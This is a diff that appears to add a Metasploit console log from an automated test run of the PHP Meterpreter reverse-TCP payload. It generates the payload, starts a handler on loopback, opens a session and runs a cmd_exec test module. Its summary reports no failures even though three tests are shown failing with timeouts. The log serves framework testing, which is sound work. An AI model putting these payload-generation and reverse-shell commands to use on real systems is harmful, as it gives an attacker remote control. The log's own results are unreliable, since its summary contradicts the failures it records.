@@ -1,0 +1,36 @@
+use php/meterpreter_reverse_tcp
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-1612-fwf8u4.php -f raw AutoVerifySessionTimeout=10 lport=6001 lhost=127.0.0.1
+[*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-1612-fwf8u4.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:50112 ) at 2022-02-05 20:02:27 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=1 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 1
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec quote tests
+before running test: should return the result of echo with single quotes
+[+] should return the result of echo with single quotes
+before running test: should return the result of echo with double quotes
+[-] FAILED: should return the result of echo with double quotes
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Starting cmd_exec stderr tests
+before running test: should return the stderr output
+[-] FAILED: should return the stderr output
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+[*] meterpreter?
+[-] FAILED: should return the result of echo
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Testing complete in 0.2548278
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > 
